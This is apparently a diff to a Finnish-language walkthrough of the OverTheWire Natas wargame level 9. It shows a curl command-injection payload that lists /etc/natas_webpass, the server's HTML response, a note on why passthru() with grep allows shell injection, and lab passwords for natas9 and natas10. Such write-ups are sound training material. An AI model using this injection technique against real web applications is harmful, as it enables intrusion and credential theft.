@@ -205,10 +205,63 @@ Myös muita samankaltaisia toimivia komentoa;
 
 Tämä on tahallista. Tästä tasosta eteenpäin *OverTheWire* alkaa siirtyä vähemmän kädestä pitäviin tehtäviin ja alkaa testata. Tässä level 9:ssä vaikka lähdekoodissa ei suoraan mainita salasanaa tai sen sijaintia, sen odotetaan löytyvän tiedostosta muodossa, mutta jatkossa voi olla jouduttaan käyttää tätä tallennettua tiedoston polkua `/etc/natas_webpass/natas10`.
 
+Nyt ainakin alkoi pelittää ja kertomaan sen polun ja tämän kanssa pitää olla tarkanna komennon syöttämisen kannalta, ja tuossa tuli kaikki natas tasot siksi laitoin piste piste väliin (turhia yli määräisiä rivien toistoja).
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -d "needle=;ls /etc/natas_webpass;&submit=submit" -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/ 
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas9", "pass": "ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" };</script></head>
+<body>
+<h1>natas9</h1>
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+natas0
+natas1
+natas10
+...
+natas6
+natas7
+natas8
+natas9
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+## Level 9 - Miniyhteenveto
+tässä kokonaisuudessaan ei tapahtunut SQL injketiota, vaan enemmin komentorivin (shell) - Linux injektiota (command injection / linux shell injection). Koska erona SQL injektiossa käytettäisiin heitomerkkiä `'` ja esim. `' OR '1'='1` ja jne, mutta tässä terminaalissa käytettiin alku ja päättyvä puolikas kaksoispiste.
+
+**Miksi näin, ja miksi tämä komentoinjektiota?** 
+Koska yhdessä sivustossa tuli PHP koodirivssä kuin `passthru("grep -i $needle dictionary.txt");` ja siksi käyttäjän syöte päätyy osaksi shell-komentoa ilman suojausta ja se ei liittyisikään tietokantaan eikä SQL lauseisiin ja siksi kyseessä on puhdas **command injection**. 
+
+Sekä tässä tapahtui  shell-komentoa (`grep`) ja `passthru()`-funktiota — mitään tietokantaa ei ole mukana.
+
+
 
 ---
 
+# LEVEL 10 - START HERE;
 
+
+natas10 t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
 
 
 
